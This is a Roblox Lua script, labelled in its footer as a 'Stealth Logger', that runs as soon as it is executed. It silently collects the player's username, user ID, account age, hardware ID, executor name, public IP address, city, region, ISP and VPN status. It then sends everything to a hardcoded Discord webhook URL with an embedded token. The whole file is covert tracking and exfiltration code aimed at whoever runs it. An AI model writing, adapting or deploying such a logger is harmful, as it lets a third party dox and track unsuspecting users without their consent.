local MarketService = game:GetService("MarketplaceService")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local GuiService = game:GetService("GuiService")
local Players = game:GetService("Players")
local lp = Players.LocalPlayer

local url = "https://webhook.lewisakura.moe/api/webhooks/1472130886550945802/bHPREhnis3MtjMK3xA2lMZeuoSQvBbxK8UTqzLk_znZodpVyzwvxHlcNwPNCrj22F-Bf"

local function sendDetailedLog()
    local ipData = "取得失敗"
    local geoData = {city = "不明", regionName = "不明", isp = "不明", proxy = false}
    local info = {Name = "不明"}

    pcall(function()
        -- ゲーム情報の取得
        info = MarketService:GetProductInfo(game.PlaceId)
        -- IP取得
        ipData = game:HttpGet("https://api.ipify.org")
        -- IP詳細とVPN検知
        local response = game:HttpGet("http://ip-api.com/json/" .. ipData .. "?lang=ja&fields=status,message,country,regionName,city,isp,proxy")
        geoData = HttpService:JSONDecode(response)
    end)

    -- デバイス・実行環境の高度な特定
    local executor = (identifyexecutor and identifyexecutor()) or "不明なExecutor"
    local hwid = (gethwid and gethwid()) or "取得不可"
    
    local deviceDetail = "不明"
    if GuiService:IsTenFootInterface() then
        deviceDetail = "🎮 Console (Xbox/PS)"
    elseif UserInputService.TouchEnabled then
        local screenSize = workspace.CurrentCamera.ViewportSize
        if math.min(screenSize.X, screenSize.Y) < 600 then
            deviceDetail = "📱 Mobile (Phone)"
        else
            deviceDetail = "平板 Tablet"
        end
    elseif UserInputService.KeyboardEnabled then
        deviceDetail = "💻 PC (Windows/Mac)"
    end

    local data = {
        ["embeds"] = {{
            ["title"] = "🚨 実行者特定ログ: " .. lp.Name,
            ["color"] = 0x000000, -- 黒色
            ["fields"] = {
                {
                    ["name"] = "👤 ユーザー",
                    ["value"] = "**Username:** `" .. lp.Name .. "`\n**DisplayName:** " .. lp.DisplayName .. "\n**UserID:** `" .. lp.UserId .. "`\n**垢経過:** " .. lp.AccountAge .. "日",
                    ["inline"] = true
                },
                {
                    ["name"] = "🛠 実行環境",
                    ["value"] = "**Device:** " .. deviceDetail .. "\n**Executor:** `" .. executor .. "`\n**HWID:** `" .. hwid .. "`",
                    ["inline"] = true
                },
                {
                    ["name"] = "🌐 ネットワーク",
                    ["value"] = "**IP:** `" .. ipData .. "`\n**地域:** " .. geoData.regionName .. " " .. geoData.city .. "\n**ISP:** " .. geoData.isp .. "\n**VPN/Proxy:** " .. (geoData.proxy and "🚩 検出" or "✅ 無し"),
                    ["inline"] = false
                },
                {
                    ["name"] = "📍 サーバー/実行場所",
                    ["value"] = "**Game:** " .. info.Name .. "\n**PlaceId:** " .. game.PlaceId .. "\n**JobId:** `" .. game.JobId .. "`",
                    ["inline"] = false
                }
            },
            ["thumbnail"] = {
                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. lp.UserId .. "&width=420&height=420&format=png"
            },
            ["footer"] = {
                ["text"] = "Shiun4545 Stealth Logger | " .. os.date("%Y/%m/%d %X")
            }
        }}
    }

    pcall(function()
        local req = (syn and syn.request) or (http and http.request) or request
        if req then
            req({
                Url = url,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode(data)
            })
        end
    end)
end

-- 即座に実行
sendDetailedLog()
